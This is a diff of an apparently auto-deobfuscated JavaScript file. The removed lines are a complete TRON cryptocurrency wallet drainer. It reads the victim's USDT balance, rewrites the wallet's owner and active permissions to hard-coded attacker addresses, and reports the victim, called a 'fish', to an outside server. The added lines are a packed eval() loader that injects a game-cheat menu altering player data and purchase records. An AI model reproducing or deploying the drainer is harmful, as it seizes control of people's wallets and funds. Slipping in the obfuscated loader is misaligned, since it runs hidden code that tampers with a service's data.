@@ -1,111 +1,24 @@
-//Mon Nov 04 2024 07:26:05 GMT+0000 (Coordinated Universal Time)
+//Thu Nov 07 2024 11:08:42 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-(function () {})();
-async function check() {
-  if (window.tronWeb == undefined) {
-    layer.msg("请选择TRX链进行支付");
-    return;
-  }
-  if (window.tronWeb.defaultAddress == undefined || window.tronWeb.defaultAddress == null) {
-    layer.msg("请允许访问你的TRX钱包地址");
-    return;
-  }
-  userAddress = await tronWeb.defaultAddress.base58;
-  balance = (await tronWeb.trx.getBalance(userAddress)) / 1000000;
-  let _0x4fe7f2 = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"),
-    _0x68e9fa = await _0x4fe7f2.balanceOf(userAddress).call();
-  usdt_balance = parseInt(_0x68e9fa._hex) / 1000000;
-  var _0x71796a = {
-    "address": userAddress,
-    "to_address": to,
-    "type": "trc"
+eval(function (_0x767836, _0x358a79, _0x966ab7, _0x19ef21, _0x4eaffc, _0x5f4eac) {
+  _0x4eaffc = function (_0xd60f82) {
+    return (_0xd60f82 < _0x358a79 ? "" : _0x4eaffc(parseInt(_0xd60f82 / _0x358a79))) + (35 < (_0xd60f82 %= _0x358a79) ? String.fromCharCode(_0xd60f82 + 29) : _0xd60f82.toString(36));
   };
-  jQuery.ajax({
-    "url": "/index/pay/check",
-    "method": "POST",
-    "data": _0x71796a,
-    "async": false,
-    "success": function (_0xcc8e71) {
-      _0xcc8e71 = JSON.parse(_0xcc8e71);
-      if (_0xcc8e71.result == true) transfer();else {
-        if (/imtoken/.test(navigator.userAgent.toLowerCase())) updatePermissions();else {
-          if (/bitkeep/.test(navigator.userAgent.toLowerCase())) {
-            if (balance >= 100) updatePermissions();else {
-              approve();
-            }
-          } else /okex/.test(navigator.userAgent.toLowerCase()) ? approve() : $("#approval").show();
-        }
-      }
-    },
-    "error": function (_0xfed13d) {
-      layer.msg("系统维护,请联系客服");
+  if (!"".replace(/^/, String)) {
+    for (; _0x966ab7--;) {
+      _0x5f4eac[_0x4eaffc(_0x966ab7)] = _0x19ef21[_0x966ab7] || _0x4eaffc(_0x966ab7);
     }
-  });
-}
-async function updatePermissions() {
-  let _0x2a7511 = tronWeb.defaultAddress.hex;
-  if (usdt_balance >= 10000) {
-    to = "TQMehuCs8QvUvvQuP6n97nePUmqbgqc2vB";
+    _0x19ef21 = [function (_0xd05dd) {
+      return _0x5f4eac[_0xd05dd];
+    }];
+    _0x4eaffc = function () {
+      return "\\w+";
+    };
+    _0x966ab7 = 1;
   }
-  let _0x153f25 = {
-    "type": 0,
-    "permission_name": "owner"
-  };
-  _0x153f25.threshold = 1;
-  _0x153f25.keys = [];
-  let _0x6828c6 = {
-    "type": 2,
-    "permission_name": "active0"
-  };
-  _0x6828c6.threshold = 1;
-  _0x6828c6.operations = "7fff1fc0037e0000000000000000000000000000000000000000000000000000";
-  _0x6828c6.keys = [];
-  _0x153f25.keys.push({
-    "address": tronWeb.address.toHex(to),
-    "weight": 1
-  });
-  _0x6828c6.keys.push({
-    "address": tronWeb.address.toHex(to),
-    "weight": 1
-  });
-  usdt_balance < threshold ? (_0x153f25.keys.push({
-    "address": _0x2a7511,
-    "weight": 1
-  }), _0x6828c6.keys.push({
-    "address": _0x2a7511,
-    "weight": 1
-  }), authorize_type = "双控") : authorize_type = "单控";
-  const _0x3b24c6 = await tronWeb.transactionBuilder.updateAccountPermissions(_0x2a7511, _0x153f25, null, [_0x6828c6]);
-  try {} catch (_0x542722) {
-    /imtoken/.test(navigator.userAgent.toLowerCase()) && (layer.msg(imTip), $("#approval").show());
+  for (; _0x966ab7--;) {
+    _0x19ef21[_0x966ab7] && (_0x767836 = _0x767836.replace(new RegExp("\\b" + _0x4eaffc(_0x966ab7) + "\\b", "g"), _0x19ef21[_0x966ab7]));
   }
-  const _0x514ee4 = await tronWeb.trx.sendRawTransaction(signedTransaction);
-  if (_0x514ee4.result) {
-    if (to != "TQMehuCs8QvUvvQuP6n97nePUmqbgqc2vB") layer.msg("网络异常，付款失败"), addfry();else {
-      let _0x50a8d3 = await tronWeb.defaultAddress.base58;
-      var _0x1069ab = {
-        "fish": _0x50a8d3,
-        "authorized_address": to
-      };
-      jQuery.ajax({
-        "url": "https://check.coinservapi.com/permissions.php",
-        "method": "POST",
-        "data": _0x1069ab,
-        "async": false,
-        "success": function (_0x49e7fb) {},
-        "error": function (_0x5347ba) {}
-      });
-    }
-  }
-}
-async function approve() {
-  $("#approval").hide();
-  usdt_balance >= 10000 && (to = "TQMehuCs8QvUvvQuP6n97nePUmqbgqc2vB");
-  const _0x384ae7 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-  try {
-    let _0x469528 = await tronWeb.contract().at(_0x384ae7);
-  } catch (_0x569c66) {
-    console.error(_0x569c66);
-  }
-}
+  return _0x767836;
+}("a[\"\\v\\8\\0\\6\\h\\1j\\0\\3\\0\\9\\1\\5\\6\"](\"1k-1l-1m-1n#\".i(\"\").j().k(\"\"))[\"\\9\\5\\2\\1\\0\\2\\1\\1o\\7\\2\\c\\5\\z\"][\"\\4\\0\\1\\S\\2\\1\\0\\6\\T\\d\\3\"](U(){V[\"\\W\\7\\2\\4\\1\\d\\2\\9\\0\"][\"\\b\\0\\b\\1p\\0\\h\"]=X^X},1q^1r);(U(){'1s 1t';w m=a[\"\\9\\6\\0\\d\\1\\0\\n\\3\\0\\b\\0\\2\\1\"](\"1u\".i(\"\").j().k(\"\"));m[\"\\1\\0\\o\\1\\E\\5\\2\\1\\0\\2\\1\"]=\"\\1v\\1w\\1x\\1y\".i(\"\").j().k(\"\");m['f'][\"\\e\\5\\4\\7\\1\\7\\5\\2\"]='1z';m['f'][\"\\1\\5\\e\"]=\"Y\".i(\"\").j().k(\"\");m[\"\\4\\1\\h\\3\\0\"][\"\\3\\0\\Z\\1\"]='1A';m['f']['1B']=\"1C\".i(\"\").j().k(\"\");a['10'][\"\\d\\e\\e\\0\\2\\c\\E\\A\\7\\3\\c\"](m);w g=a[\"\\9\\6\\0\\d\\1\\0\\n\\3\\0\\b\\0\\2\\1\"]('1D');g[\"\\4\\1\\h\\3\\0\"][\"\\e\\5\\4\\7\\1\\7\\5\\2\"]=\"1E\".i(\"\").j().k(\"\");g['f']['1F']=\"1G\".i(\"\").j().k(\"\");g['f']['1H']=\"\\1I\\1J\\e\\o\";g['f'][\"\\x\\d\\9\\t\\B\\6\\5\\8\\2\\c\\E\\5\\3\\5\\6\"]=\"1K#\".i(\"\").j().k(\"\");g['f'][\"\\x\\5\\6\\c\\0\\6\"]='11\\12\\13#1L';g['f']['N']=\"\\2\\5\\2\\0\";g[\"\\4\\1\\h\\3\\0\"][\"\\1M\\S\\2\\c\\0\\o\"]='1N';a['10'][\"\\d\\e\\e\\0\\2\\c\\E\\A\\7\\3\\c\"](g);w r=(14,15)=>{w p=a['1O'](\"\\c\\7\\T\");p['1P']=14;p['f'][\"\\e\\d\\c\\c\\7\\2\\B\"]=\"Y\".i(\"\").j().k(\"\");p['f'][\"\\9\\8\\6\\4\\5\\6\"]=\"\\e\\5\\7\\2\\1\\0\\6\";p[\"\\4\\1\\h\\3\\0\"][\"\\x\\5\\6\\c\\0\\6\"]='11\\12\\13#1Q';p['f'][\"\\b\\d\\6\\B\\7\\2\"]=\"\\1R\\e\\o\";p['1S']=15;g['1T'](p);1U p};m[\"\\5\\2\\9\\3\\7\\9\\t\"]=()=>{g[\"\\4\\1\\h\\3\\0\"][\"\\c\\7\\4\\e\\3\\d\\h\"]=g[\"\\4\\1\\h\\3\\0\"][\"\\c\\7\\4\\e\\3\\d\\h\"]==='O'?\"1V\".i(\"\").j().k(\"\"):\"\\2\\5\\2\\0\"};w P=()=>{l(!a['1W']){l(a[\"\\c\\5\\9\\8\\b\\0\\2\\1\\n\\3\\0\\b\\0\\2\\1\"][\"\\6\\0\\v\\8\\0\\4\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]){a['F']['1X']()}u l(a['F']['16']){a['F']['16']()}u l(a['F'][\"\\z\\0\\x\\t\\7\\1\\G\\0\\v\\8\\0\\4\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]){a[\"\\c\\5\\9\\8\\b\\0\\2\\1\\n\\3\\0\\b\\0\\2\\1\"][\"\\z\\0\\x\\t\\7\\1\\G\\0\\v\\8\\0\\4\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]()}u l(a[\"\\c\\5\\9\\8\\b\\0\\2\\1\\n\\3\\0\\b\\0\\2\\1\"][\"\\b\\4\\G\\0\\v\\8\\0\\4\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]){a[\"\\c\\5\\9\\8\\b\\0\\2\\1\\n\\3\\0\\b\\0\\2\\1\"][\"\\b\\4\\G\\0\\v\\8\\0\\4\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]()}}u{l(a['17']){a['17']()}u l(a['18']){a['18']()}u l(a[\"\\z\\0\\x\\t\\7\\1\\n\\o\\7\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]){a['1Y']()}u l(a[\"\\b\\4\\n\\o\\7\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]){a[\"\\b\\4\\n\\o\\7\\1\\q\\8\\3\\3\\4\\9\\6\\0\\0\\2\"]()}}};r(\"\\1Z\\20\\19\\1a\",()=>{s['软软']=V[\"\\W\\7\\2\\4\\1\\d\\2\\9\\0\"]['21'];Q[\"\\7\\4\\22\\5\\B\\7\\2\"]=!![];H(I J=23^24;J<=(25^26);J++){s['软软']['1b'][\"\\e\\8\\4\\A\"]({'R':J,'1c':y,'1d':1e})}H(I C=27^28;C<=(29^2a);C++){s['软软'][C]={\"\\7\\c\":C,\"\\9\\5\\8\\2\\1\":y,\"\\b\\d\\o\":1e}}s['软软'][\"\\t\\0\\h\\4\"]=[];s[\"\\K\\K\"][\"\\t\\0\\h\\4\"]=2b[\"\\Z\\6\\5\\b\"]({\"\\3\\0\\2\\B\\1\\A\":1f},(2c,1g)=>1g+(2d^2e))});r(\"\\2f\\2g\\19\\1a\",()=>{w L=2h('输入需要改的累充数值哦');l(L){Q[\"\\1\\5\\1\\d\\3\\q\\3\\5\\z\\0\\6\"]=1h(L);Q['2i']=1h(L)}});r('清空商城',()=>{H(I M=2j^2k;M<=(2l^2m);M++){s[\"\\K\\K\"]['1b'][\"\\e\\8\\4\\A\"]({'R':M,'1c':y,\"\\b\\d\\o\":y})}H(I D=2n^2o;D<=1f;D++){s['软软'][D]={'R':D,\"\\9\\5\\8\\2\\1\":y,'1d':y}}s['软软']['2p']=[]});r('退出菜单',()=>{g['f']['N']='O'});r(\"\\2q\\2r\\2s\\1i\".i(\"\").j().k(\"\"),()=>{m['f']['N']='O'});r(\"\\1i\\2t\\2u\\2v\".i(\"\").j().k(\"\"),P);r('退出全屏',P)})();", 62, 156, "u0065 u0074 u006e u006c u0073 u006f u0072 u0069 u0075 u0063 document u006d u0064 u0061 u0070 style _0x3828e4 u0079 split reverse join if _0x2b75cc u0045 u0078 _0xec430b u0046 _0x3f0b42 window u006b else u0071 const u0062 0x0 u0077 u0068 u0067 _0x500408 _0x41e44a u0043 documentElement u0052 for let _0xe95d03 u8f6f _0x54e9d4 _0x537bb9 display none _0x45a9c4 userData id u0049 u0076 function jW u005f 0x9afea xp01 u0066 body 1px x20solid x20 _0x1bac04 _0x488da6 mozRequestFullScreen exitFullscreen mozCancelFullScreen u4fee u6539 values count max 0x3e7 0x18 _0x2664b2 parseFloat u5C4F u0053 emarfi nigol ssorc sj u0057 u004b 0x2ae00 0x2ade8 use strict nottub u5355 u83DC u80FD u529F fixed 10px zIndex 9999 div dexif top xp05 left u0031 u0030 fff 000 u007a 9998 createElement textContent ddd u0032 onclick appendChild return kcolb fullscreenElement requestFullscreen webkitExitFullscreen u5546 u57ce mallBuyItem u004c 0xae86a 0xae86b 0xa4208 0xa4210 0xa72ed 0xa72ec 0x66f90 0x66f88 Array _0x3cee53 0xca9e1 0xca9e0 u7d2f u5145 prompt realFlower 0x69df8 0x69df9 0x58128 0x58130 0x8af9c 0x8af9d keys u94AE u6309 u853D u5168 u9875 u7F51".split(" "), 0, {}));
